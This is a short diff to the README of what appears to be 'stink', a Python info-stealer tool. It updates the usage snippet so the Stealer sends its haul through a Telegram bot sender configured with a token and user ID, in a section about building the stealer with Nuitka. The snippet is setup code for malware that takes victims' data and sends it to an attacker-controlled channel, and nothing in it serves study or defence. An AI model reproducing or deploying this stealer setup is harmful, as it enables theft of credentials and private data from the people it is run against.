@@ -117,9 +117,10 @@ We will need Nuitka to do this.
 3. Create test.py (or any other name) file in the same directory with the following code:
 ```python
 from stink import Stealer
+from stink.utils.senders import TelegramSender
 
 if __name__ == '__main__':
-    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
 ```
 
 #### With BAT
